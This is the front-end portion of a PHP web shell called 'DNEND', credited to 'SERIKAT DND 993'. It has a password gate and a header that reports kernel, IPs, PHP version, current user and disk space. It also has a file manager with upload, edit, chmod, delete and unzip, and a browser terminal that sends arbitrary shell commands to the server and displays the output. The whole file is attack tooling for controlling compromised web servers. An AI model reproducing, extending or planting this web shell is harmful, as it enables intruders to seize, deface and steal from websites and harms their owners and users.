  #em .modal{max-width:100vw;max-height:100vh;border-radius:0}
}
</style>
</head>
<body>
<?php if(!$LOGGED): ?>
<div class="lp">
<pre class="la">
██████╗ ███╗   ██╗███████╗███╗   ██╗██████╗
██╔══██╗████╗  ██║██╔════╝████╗  ██║██╔══██╗
██║  ██║██╔██╗ ██║█████╗  ██╔██╗ ██║██║  ██║
██║  ██║██║╚██╗██║██╔══╝  ██║╚██╗██║██║  ██║
██████╔╝██║ ╚████║███████╗██║ ╚████║██████╔╝
╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═══╝╚═════╝</pre>
<div class="lb">
  <h2>Authentication Required</h2>
  <p>DNEND <?php echo DNEND_VER; ?> &bull; <?php echo dnH($domain); ?></p>
  <?php if(isset($LOGIN_ERR)): ?>
  <div class="le">&#9888; <?php echo dnH($LOGIN_ERR); ?></div>
  <?php endif; ?>
  <form method="post" autocomplete="off">
    <input type="hidden" name="dnend_login" value="1">
    <input type="password" name="pass" placeholder="Password" autofocus>
    <button class="btn btn-bl" type="submit">
      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"/><polyline points="10 17 15 12 10 7"/><line x1="15" y1="12" x2="3" y2="12"/></svg>
      Sign In
    </button>
  </form>
</div>
<div class="pf">DNEND <?php echo DNEND_VER; ?> &bull; by <b>SERIKAT DND 993</b></div>
</div>

<?php else: ?>
<div class="wrap">

<div class="hdr">
  <div class="info-blk">
    <div class="info-label">System Information</div>
    <div class="info-grid">
      <span class="ik">Kernel</span><span class="iv"><?php echo dnH($uname); ?></span>
      <span class="ik">IP</span><span class="iv g"><?php echo dnH($server_ip); ?> <span style="color:var(--tx3)">&#10142;</span> <?php echo dnH($client_ip); ?></span>
      <span class="ik">PHP</span><span class="iv"><?php echo dnH($php_ver); ?> <span style="color:var(--tx3)">(<?php echo PHP_SAPI; ?>)</span></span>
      <span class="ik">User</span><span class="iv g"><?php echo dnH($whoami); ?></span>
      <span class="ik">Disk</span><span class="iv"><?php echo $disk_free; ?> free / <?php echo $disk_total; ?></span>
    </div>
  </div>
  <div class="logo-blk">
    <pre class="logo-art">
██████╗ ███╗   ██╗███████╗███╗   ██╗██████╗
██╔══██╗████╗  ██║██╔════╝████╗  ██║██╔══██╗
██║  ██║██╔██╗ ██║█████╗  ██╔██╗ ██║██║  ██║
██║  ██║██║╚██╗██║██╔══╝  ██║╚██╗██║██║  ██║
██████╔╝██║ ╚████║███████╗██║ ╚████║██████╔╝
╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═══╝╚═════╝</pre>
    <div class="logo-meta"><?php echo DNEND_VER; ?> &bull; by <b>SERIKAT DND 993</b> &bull; <?php echo dnH($domain); ?></div>
  </div>
</div>

<div class="hdiv"></div>

<?php if($msg): ?><div class="alert a-ok">&#10003; <?php echo dnH($msg); ?></div><?php endif; ?>
<?php if($err): ?><div class="alert a-err">&#9888; <?php echo dnH($err); ?></div><?php endif; ?>

<div class="toolbar">
  <button class="btn btn-gr" onclick="openM('mn')">
    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="12" y1="18" x2="12" y2="12"/><line x1="9" y1="15" x2="15" y2="15"/></svg>
    New File
  </button>
  <button class="btn btn-bl" onclick="openM('md')">
    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/><line x1="12" y1="11" x2="12" y2="17"/><line x1="9" y1="14" x2="15" y2="14"/></svg>
    New Folder
  </button>
  <button class="btn btn-ye" onclick="openM('mu')">
    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="16 16 12 12 8 16"/><line x1="12" y1="12" x2="12" y2="21"/><path d="M20.39 18.39A5 5 0 0 0 18 9h-1.26A8 8 0 1 0 3 16.3"/></svg>
    Upload
  </button>
  <button class="btn btn-cy" id="tbtn" onclick="toggleTerm()">
    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>
    Terminal
  </button>
  <a href="?logout=1" class="btn btn-re" onclick="return confirm('Logout?')">
    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>
    Logout
  </a>
</div>

<div class="pathbar">
  <?php if($parent !== $cwd): ?>
  <a class="up-btn" href="?p=<?php echo $parentEnc; ?>" title="Up">
    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><polyline points="15 18 9 12 15 6"/></svg>
  </a>
  <?php endif; ?>
  <?php echo breadcrumb($cwd, $homeEnc); ?>
</div>

<div class="fs">
  <form id="ff" method="post" action="?p=<?php echo $cwdEnc; ?>">
    <input type="hidden" name="action" id="ba" value="">
    <div class="fs-scroll">
      <table class="ft">
        <thead>
          <tr>
            <th class="cc"><input type="checkbox" id="cm" onchange="mChk(this)" title="Select all"></th>
            <th>Name</th>
            <th class="cp">Permissions</th>
            <th class="co">Octal</th>
            <th class="cs">Size</th>
            <th class="cm">Modified</th>
            <th style="text-align:right;white-space:nowrap">Actions</th>
          </tr>
        </thead>
        <tbody>
<?php if(empty($items)): ?>
        <tr><td colspan="7">
          <div class="empty">
            <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>
            Directory is empty
          </div>
        </td></tr>
<?php else: ?>
<?php foreach($items as $it):
  $isZip = !$it['isdir'] && strtolower(pathinfo($it['name'],PATHINFO_EXTENSION))==='zip';
  $extUp = strtoupper(pathinfo($it['name'],PATHINFO_EXTENSION));
  if($extUp==='') $extUp='FILE';
  $jName = htmlspecialchars(json_encode($it['name']),ENT_QUOTES,'UTF-8');
  $jOct  = htmlspecialchars(json_encode($it['oct']),ENT_QUOTES,'UTF-8');
  $jLang = htmlspecialchars(json_encode(monacoLang($it['name'])),ENT_QUOTES,'UTF-8');
  $jDisp = htmlspecialchars(json_encode(fileLang($it['name'])),ENT_QUOTES,'UTF-8');
  $jFenc = htmlspecialchars(json_encode(encP($it['name'])),ENT_QUOTES,'UTF-8');
  $fEnc  = encP($it['name']);
  if($it['isdir']){$szCell='<span style="color:var(--bd2)">&#8212;</span>';}
  else{$szCell=dnH(dnSize($it['size']));}
?>
        <tr class="fr">
          <td class="cc"><input type="checkbox" name="targets[]" value="<?php echo dnH($it['name']); ?>" class="ic" onchange="upd()"></td>
          <td>
            <div class="nc">
<?php if($it['isdir']): ?>
              <svg class="ficon" viewBox="0 0 24 24" fill="none" stroke="var(--folder)" stroke-width="2"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>
              <span class="fdi"><a href="?p=<?php echo encP($it['path']); ?>"><?php echo dnH($it['name']); ?></a></span>
              <span class="dtag">DIR</span>
<?php else: ?>
              <svg class="ficon" viewBox="0 0 24 24" fill="none" stroke="var(--tx3)" stroke-width="1.8"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
              <span class="ffi"><button type="button" onclick="openEd(<?php echo $jName; ?>,<?php echo $jLang; ?>,<?php echo $jDisp; ?>,<?php echo $jFenc; ?>)"><?php echo dnH($it['name']); ?></button></span>
              <span class="etag"><?php echo $extUp; ?></span>
<?php endif; ?>
            </div>
          </td>
          <td class="cp"><?php echo dnH($it['perm']); ?></td>
          <td class="co"><?php echo dnH($it['oct']); ?></td>
          <td class="cs"><?php echo $szCell; ?></td>
          <td class="cm"><?php echo date('Y-m-d H:i',$it['mtime']); ?></td>
          <td class="ca">
            <div style="display:flex;gap:3px;justify-content:flex-end">
              <button type="button" class="bi r" title="Rename" onclick="doRn(<?php echo $jName; ?>)">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 3a2.828 2.828 0 1 1 4 4L7.5 20.5 2 22l1.5-5.5L17 3z"/></svg>
              </button>
              <button type="button" class="bi c" title="Permissions" onclick="doCh(<?php echo $jName; ?>,<?php echo $jOct; ?>)">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="3"/><path d="M19.07 4.93a10 10 0 1 1-14.14 0"/></svg>
              </button>
<?php if(!$it['isdir']): ?>
              <a class="bi d" title="Download" href="?action=download&amp;p=<?php echo $cwdEnc; ?>&amp;f=<?php echo $fEnc; ?>">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="8 17 12 21 16 17"/><line x1="12" y1="12" x2="12" y2="21"/><path d="M20.88 18.09A5 5 0 0 0 18 9h-1.26A8 8 0 1 0 3 16.72"/></svg>
              </a>
<?php endif; ?>
<?php if($isZip): ?>
              <button type="button" class="bi u" title="Unzip" onclick="doUz(<?php echo $jName; ?>)">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
              </button>
<?php endif; ?>
              <button type="button" class="bi x" title="Delete" onclick="doDl(<?php echo $jName; ?>)">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a1 1 0 0 1 1-1h4a1 1 0 0 1 1 1v2"/></svg>
              </button>
            </div>
          </td>
        </tr>
<?php endforeach; endif; ?>
        </tbody>
      </table>
    </div>
    <div class="bf">
      <span class="sl">Selected:</span>
      <span class="sc" id="sc">0</span>
      <div class="bdw" id="bdw">
        <button type="button" class="bmb" id="bmbtn" onclick="toggleBM(event)">
          <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="1"/><circle cx="19" cy="12" r="1"/><circle cx="5" cy="12" r="1"/></svg>
          Bulk Actions
          <svg class="chv" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="18 15 12 9 6 15"/></svg>
        </button>
        <div class="bmd" id="bmd">
          <button type="button" class="bmi bz" onclick="bulkDo('zip')">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"/></svg>
            Zip Selected
          </button>
          <div class="bm-sep"></div>
          <button type="button" class="bmi bu" onclick="bulkDo('unzip')">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
            Unzip Selected
          </button>
          <div class="bm-sep"></div>
          <button type="button" class="bmi bd" onclick="bulkDo('bulk_delete')">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a1 1 0 0 1 1-1h4a1 1 0 0 1 1 1v2"/></svg>
            Delete Selected
          </button>
        </div>
      </div>
    </div>
  </form>
</div>

<div class="pf">
  DNEND <?php echo DNEND_VER; ?> &bull; by <b>SERIKAT DND 993</b> &bull; <?php echo count($items); ?> items &bull; <?php echo dnH($domain); ?><br>
  <small style="color:var(--tx3)">Dev Natan Utama &copy; 2026</small>
</div>
</div>

<div class="ov" id="mdl"><div class="modal">
  <div class="mh"><div class="mt">
    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="var(--red)" stroke-width="2.5"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a1 1 0 0 1 1-1h4a1 1 0 0 1 1 1v2"/></svg>Delete
  </div><button class="mc" onclick="closeM('mdl')">&#10005;</button></div>
  <form method="post" action="?p=<?php echo $cwdEnc; ?>">
    <input type="hidden" name="action" value="delete">
    <div class="fr"><label>Target</label><input type="text" name="target" id="dtgt" readonly></div>
    <p style="color:var(--tx3);font-size:.73rem;margin-bottom:4px">Cannot be undone. Folders removed recursively.</p>
    <div class="ma">
      <button class="btn btn-re" type="submit">Confirm Delete</button>
      <button class="btn btn-def" type="button" onclick="closeM('mdl')">Cancel</button>
    </div>
  </form>
</div></div>

<div class="ov" id="mrn"><div class="modal">
  <div class="mh"><div class="mt">
    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="var(--cyan)" stroke-width="2.5"><path d="M17 3a2.828 2.828 0 1 1 4 4L7.5 20.5 2 22l1.5-5.5L17 3z"/></svg>Rename
  </div><button class="mc" onclick="closeM('mrn')">&#10005;</button></div>
  <form method="post" action="?p=<?php echo $cwdEnc; ?>">
    <input type="hidden" name="action" value="rename">
    <div class="fr"><label>Current name</label><input type="text" name="old" id="ron" readonly style="color:var(--tx3)"></div>
    <div class="fr"><label>New name</label><input type="text" name="new_name" id="rnn"></div>
    <div class="ma">
      <button class="btn btn-cy" type="submit">Apply Rename</button>
      <button class="btn btn-def" type="button" onclick="closeM('mrn')">Cancel</button>
    </div>
  </form>
</div></div>

<div class="ov" id="mch"><div class="modal">
  <div class="mh"><div class="mt">
    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="var(--yellow)" stroke-width="2.5"><circle cx="12" cy="12" r="3"/><path d="M19.07 4.93a10 10 0 1 1-14.14 0"/></svg>Permissions
  </div><button class="mc" onclick="closeM('mch')">&#10005;</button></div>
  <form method="post" action="?p=<?php echo $cwdEnc; ?>">
    <input type="hidden" name="action" value="chmod">
    <div class="fr"><label>File / Folder</label><input type="text" name="target" id="ctgt" readonly style="color:var(--tx3)"></div>
    <div class="chg">
      <?php foreach([['Owner','owner'],['Group','group'],['Others','others']] as $chRow): ?>
      <div class="chc">
        <div class="cl"><?php echo $chRow[0]; ?></div>
        <?php foreach([['Read','r'],['Write','w'],['Execute','x']] as $chBit): ?>
        <label class="chr"><input type="checkbox" class="pc" onchange="rcalc()" data-g="<?php echo $chRow[1]; ?>" data-p="<?php echo $chBit[1]; ?>"> <?php echo $chBit[0]; ?></label>
        <?php endforeach; ?>
      </div>
      <?php endforeach; ?>
    </div>
    <div class="fr"><label>Octal</label><input type="text" name="mode" id="cmod" maxlength="4" placeholder="0755"></div>
    <div class="ma">
      <button class="btn btn-ye" type="submit">Apply chmod</button>
      <button class="btn btn-def" type="button" onclick="closeM('mch')">Cancel</button>
    </div>
  </form>
</div></div>

<div class="ov" id="mn"><div class="modal">
  <div class="mh"><div class="mt">
    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="var(--green)" stroke-width="2.5"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="12" y1="18" x2="12" y2="12"/><line x1="9" y1="15" x2="15" y2="15"/></svg>New File
  </div><button class="mc" onclick="closeM('mn')">&#10005;</button></div>
  <form method="post" action="?p=<?php echo $cwdEnc; ?>">
    <input type="hidden" name="action" value="newfile">
    <div class="fr"><label>Filename</label><input type="text" name="name" placeholder="example.php" autofocus></div>
    <div class="ma">
      <button class="btn btn-gr" type="submit">Create File</button>
      <button class="btn btn-def" type="button" onclick="closeM('mn')">Cancel</button>
    </div>
  </form>
</div></div>

<div class="ov" id="md"><div class="modal">
  <div class="mh"><div class="mt">
    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="var(--blue)" stroke-width="2.5"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>New Folder
  </div><button class="mc" onclick="closeM('md')">&#10005;</button></div>
  <form method="post" action="?p=<?php echo $cwdEnc; ?>">
    <input type="hidden" name="action" value="mkdir">
    <div class="fr"><label>Folder name</label><input type="text" name="name" placeholder="new_folder" autofocus></div>
    <div class="ma">
      <button class="btn btn-bl" type="submit">Create Folder</button>
      <button class="btn btn-def" type="button" onclick="closeM('md')">Cancel</button>
    </div>
  </form>
</div></div>

<div class="ov" id="mu"><div class="modal">
  <div class="mh"><div class="mt">
    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="var(--yellow)" stroke-width="2.5"><polyline points="16 16 12 12 8 16"/><line x1="12" y1="12" x2="12" y2="21"/><path d="M20.39 18.39A5 5 0 0 0 18 9h-1.26A8 8 0 1 0 3 16.3"/></svg>Upload File
  </div><button class="mc" onclick="closeM('mu')">&#10005;</button></div>
  <form method="post" enctype="multipart/form-data" action="?p=<?php echo $cwdEnc; ?>">
    <input type="hidden" name="action" value="upload">
    <div class="uzone" id="uzone" onclick="document.getElementById('ufile-inp').click()" ondragover="event.preventDefault();this.classList.add('drag')" ondragleave="this.classList.remove('drag')" ondrop="dropFile(event)">
      <svg width="34" height="34" viewBox="0 0 24 24" fill="none" stroke="var(--blue)" stroke-width="1.5"><polyline points="16 16 12 12 8 16"/><line x1="12" y1="12" x2="12" y2="21"/><path d="M20.39 18.39A5 5 0 0 0 18 9h-1.26A8 8 0 1 0 3 16.3"/></svg>
      <p><b>Click to browse</b> or drag &amp; drop</p>
      <small>All file types supported</small>
      <div class="uf-name" id="uf-name"></div>
    </div>
    <input type="file" name="ufile" id="ufile-inp" onchange="showFile(this)">
    <div class="ma">
      <button class="btn btn-ye" type="submit">Upload</button>
      <button class="btn btn-def" type="button" onclick="closeM('mu')">Cancel</button>
    </div>
  </form>
</div></div>

<div class="ov" id="em">
  <div class="modal" style="max-width:calc(100vw - 10px);width:1300px;max-height:97vh;padding:0;display:flex;flex-direction:column;overflow:hidden;border-radius:8px">
    <div class="etb">
      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="var(--blue)" stroke-width="2.5"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/></svg>
      <span class="efn" id="efn"></span>
      <span class="elb" id="elb">TXT</span>
      <span style="flex:1"></span>
      <span id="elc" style="color:var(--tx3);font-size:.65rem;font-family:var(--fm);margin-right:8px"></span>
      <button class="mc" onclick="closeM('em')">&#10005;</button>
    </div>
    <div id="ed-wrap"></div>
    <div class="ebb">
      <span class="ehi">Ctrl+S — Save &nbsp;|&nbsp; Esc — Close</span>
      <form id="ef" method="post" action="?p=<?php echo $cwdEnc; ?>" style="display:flex;gap:6px">
        <input type="hidden" name="action" value="save_edit">
        <input type="hidden" name="file" id="efi">
        <textarea name="content" id="ect" style="display:none"></textarea>
        <button type="button" class="btn btn-gr" style="height:26px;padding:0 10px;font-size:.72rem" onclick="saveEd()">
          <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M19 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11l5 5v11a2 2 0 0 1-2 2z"/><polyline points="17 21 17 13 7 13 7 21"/><polyline points="7 3 7 8 15 8"/></svg>
          Save
        </button>
        <button type="button" class="btn btn-def" style="height:26px;padding:0 10px;font-size:.72rem" onclick="closeM('em')">Close</button>
      </form>
    </div>
  </div>
</div>

<form id="uzf" method="post" action="?p=<?php echo $cwdEnc; ?>" style="display:none">
  <input type="hidden" name="action" value="unzip">
  <input type="hidden" name="target" id="uzt">
</form>

<div class="tw" id="tw">
  <div class="ttb" onclick="toggleTerm()">
    <span class="ttl">
      <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>
      Terminal <span class="tcwd" id="tcwd"></span>
    </span>
    <div class="tbb" onclick="event.stopPropagation()">
      <button class="tbtn" onclick="clearT()">Clear</button>
      <button class="tbtn" onclick="toggleTerm()">&#9660; Hide</button>
    </div>
  </div>
  <div class="tbody">
    <div class="tout" id="to"><span class="ts">DNEND Terminal <?php echo DNEND_VER; ?> — <?php echo dnH($domain); ?></span>
<span class="ts">Type a command and press Enter.</span>
</div>
    <div class="tir">
      <span class="tpr" id="tpr">$</span>
      <input class="tin" id="ti" type="text" spellcheck="false" autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="command...">
    </div>
  </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/monaco-editor@0.44.0/min/vs/loader.js"></script>
<script>
'use strict';
var CWD=<?php echo json_encode($cwd); ?>,CWDE=<?php echo json_encode($cwdEnc); ?>,tCwd=CWDE,tCwdR=CWD,tH=[],tIdx=-1,moEd=null;
require.config({paths:{vs:'https://cdn.jsdelivr.net/npm/monaco-editor@0.44.0/min/vs'}});

function openM(id){document.getElementById(id).classList.add('on');}
function closeM(id){
  document.getElementById(id).classList.remove('on');
  if(id==='em'){
    var w=document.getElementById('ed-wrap');
    if(moEd){moEd.dispose();moEd=null;}
    w.innerHTML='';w.style.height='';
  }
}
document.querySelectorAll('.ov').forEach(function(el){
  el.addEventListener('click',function(e){if(e.target===el)closeM(el.id);});
});
document.addEventListener('keydown',function(e){
  if(e.key==='Escape')document.querySelectorAll('.ov.on').forEach(function(m){closeM(m.id);});
  if((e.ctrlKey||e.metaKey)&&e.key==='s'){e.preventDefault();if(document.getElementById('em').classList.contains('on'))saveEd();}
  if((e.ctrlKey||e.metaKey)&&e.key==='`'){e.preventDefault();toggleTerm();}
});

function doDl(n){document.getElementById('dtgt').value=n;openM('mdl');}
function doRn(n){
  document.getElementById('ron').value=n;
  document.getElementById('rnn').value=n;
  openM('mrn');
  setTimeout(function(){var x=document.getElementById('rnn');x.focus();x.select();},100);
}
function doCh(n,oct){
  document.getElementById('ctgt').value=n;
  document.getElementById('cmod').value=oct;
  var v=parseInt(oct,8);
  var mp={owner:{r:256,w:128,x:64},group:{r:32,w:16,x:8},others:{r:4,w:2,x:1}};
  document.querySelectorAll('.pc').forEach(function(cb){cb.checked=!!(v&mp[cb.dataset.g][cb.dataset.p]);});
  openM('mch');
}
function rcalc(){
  var b=0;
  var mp={owner:{r:256,w:128,x:64},group:{r:32,w:16,x:8},others:{r:4,w:2,x:1}};
  document.querySelectorAll('.pc').forEach(function(cb){if(cb.checked)b|=mp[cb.dataset.g][cb.dataset.p];});
  document.getElementById('cmod').value='0'+b.toString(8).padStart(3,'0');
}
function doUz(n){
  if(!confirm('Unzip "'+n+'" here?'))return;
  document.getElementById('uzt').value=n;
  document.getElementById('uzf').submit();
}

function openEd(fname,lang,disp,fenc){
  document.getElementById('efn').textContent=fname;
  document.getElementById('elb').textContent=disp;
  document.getElementById('efi').value=fname;
  document.getElementById('elc').textContent='Loading...';
  openM('em');
  fetch(window.location.pathname+'?action=read_file&p='+encodeURIComponent(CWDE)+'&f='+encodeURIComponent(fenc))
    .then(function(r){if(!r.ok)throw new Error('HTTP '+r.status);return r.text();})
    .then(function(content){
      var wrap=document.getElementById('ed-wrap');
      wrap.innerHTML='<div style="color:#4ec9b0;font-size:.8rem;padding:14px;font-family:monospace">Loading editor...</div>';
      document.getElementById('elc').textContent=content.split('\n').length+' lines';
      require(['vs/editor/editor.main'],function(){
        wrap.innerHTML='';
        var modal=document.querySelector('#em .modal');
        var mh=modal?modal.getBoundingClientRect().height:0;
        var edH=mh>200?(mh-102):Math.floor(window.innerHeight*0.7);
        wrap.style.height=edH+'px';
        if(moEd){moEd.dispose();moEd=null;}
        moEd=monaco.editor.create(wrap,{
          value:content,
          language:lang,
          theme:'vs-dark',
          fontSize:13,
          lineNumbers:'on',
          minimap:{enabled:false},
          automaticLayout:false,
          scrollBeyondLastLine:false,
          wordWrap:'off',
          renderWhitespace:'none',
          smoothScrolling:true,
          cursorBlinking:'smooth',
          fontFamily:"'Consolas','Fira Code','SF Mono',monospace",
          lineHeight:20,
          padding:{top:8,bottom:8}
        });
        moEd.addCommand(monaco.KeyMod.CtrlCmd|monaco.KeyCode.KeyS,function(){saveEd();});
        moEd.layout({width:wrap.offsetWidth,height:edH});
        moEd.focus();
      });
    })
    .catch(function(e){document.getElementById('elc').textContent='Error';closeM('em');alert('Cannot load file:\n'+e.message);});
}
function saveEd(){
  if(!moEd)return;
  document.getElementById('ect').value=moEd.getValue();
  document.getElementById('ef').submit();
}

function showFile(inp){
  var n=inp.files[0]?inp.files[0].name:'';
  var el=document.getElementById('uf-name');
  if(n){el.textContent=n;el.style.display='block';}else el.style.display='none';
}
function dropFile(e){
  e.preventDefault();
  document.getElementById('uzone').classList.remove('drag');
  var dt=e.dataTransfer;
  if(dt&&dt.files.length){document.getElementById('ufile-inp').files=dt.files;showFile(document.getElementById('ufile-inp'));}
}

function mChk(el){document.querySelectorAll('.ic').forEach(function(c){c.checked=el.checked;});upd();}
function upd(){
  var n=document.querySelectorAll('.ic:checked').length;
  var t=document.querySelectorAll('.ic').length;
  document.getElementById('sc').textContent=n;
  var m=document.getElementById('cm');
  if(m)m.checked=(n>0&&n===t);
}
function toggleBM(e){
  e.stopPropagation();
  var menu=document.getElementById('bmd');
  var btn=document.getElementById('bmbtn');
  var open=menu.classList.toggle('show');
  btn.classList.toggle('open',open);
}
document.addEventListener('click',function(e){
  var w=document.getElementById('bdw');
  if(w&&!w.contains(e.target)){document.getElementById('bmd').classList.remove('show');document.getElementById('bmbtn').classList.remove('open');}
});
function bulkDo(act){
  document.getElementById('bmd').classList.remove('show');
  document.getElementById('bmbtn').classList.remove('open');
  var sel=[];
  document.querySelectorAll('.ic:checked').forEach(function(c){sel.push(c.value);});
  if(!sel.length){alert('No items selected.');return;}
  var labels={zip:'Zip '+sel.length+' item(s)?',unzip:'Unzip "'+sel[0]+'"?',bulk_delete:'Delete '+sel.length+' item(s) permanently?'};
  if(!confirm(labels[act]||act))return;
  if(act==='unzip'){document.getElementById('uzt').value=sel[0];document.getElementById('uzf').submit();return;}
  document.getElementById('ba').value=act;
  document.getElementById('ff').submit();
}

var tOpen=false;
function toggleTerm(){
  tOpen=!tOpen;
  document.getElementById('tw').classList.toggle('on',tOpen);
  var btn=document.getElementById('tbtn');
  if(btn)btn.style.color=tOpen?'var(--green)':'';
  if(tOpen){updPr();setTimeout(function(){document.getElementById('ti').focus();},220);}
}
function updPr(){
  var parts=tCwdR.split(/[\/\\]/);
  var last=parts.filter(Boolean).pop()||tCwdR;
  document.getElementById('tpr').textContent=last+' $';
  document.getElementById('tcwd').textContent=tCwdR;
}
function clearT(){document.getElementById('to').innerHTML='<span class="ts">Cleared — '+new Date().toLocaleTimeString()+'</span>\n';}
function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
function tApp(h){var o=document.getElementById('to');o.innerHTML+=h;o.scrollTop=o.scrollHeight;}
function runCmd(){
  var inp=document.getElementById('ti');
  var cmd=inp.value.trim();
  if(!cmd)return;
  inp.value='';
  tH.unshift(cmd);tIdx=-1;
  tApp('<span class="tc">'+esc(document.getElementById('tpr').textContent)+' '+esc(cmd)+'</span>\n');
  fetch(window.location.pathname+'?action=terminal',{
    method:'POST',
    headers:{'Content-Type':'application/x-www-form-urlencoded'},
    body:'cmd='+encodeURIComponent(cmd)+'&dir='+encodeURIComponent(tCwd)
  })
  .then(function(r){return r.json();})
  .then(function(d){
    if(d.out&&d.out.trim()!=='')tApp('<span class="to">'+esc(d.out)+'</span>\n');
    if(d.cwd){tCwd=d.cwd;tCwdR=d.cwdR||tCwdR;}
    updPr();
  })
  .catch(function(e){tApp('<span style="color:var(--red)">Error: '+esc(String(e))+'</span>\n');});
}
document.getElementById('ti').addEventListener('keydown',function(e){
  if(e.key==='Enter')runCmd();
  if(e.key==='ArrowUp'){e.preventDefault();if(tIdx<tH.length-1){tIdx++;this.value=tH[tIdx]||'';}}
  if(e.key==='ArrowDown'){e.preventDefault();tIdx>0?(tIdx--,this.value=tH[tIdx]):(tIdx=-1,this.value='');}
});

updPr();upd();
</script>
<?php endif; ?>
</body>
</html>
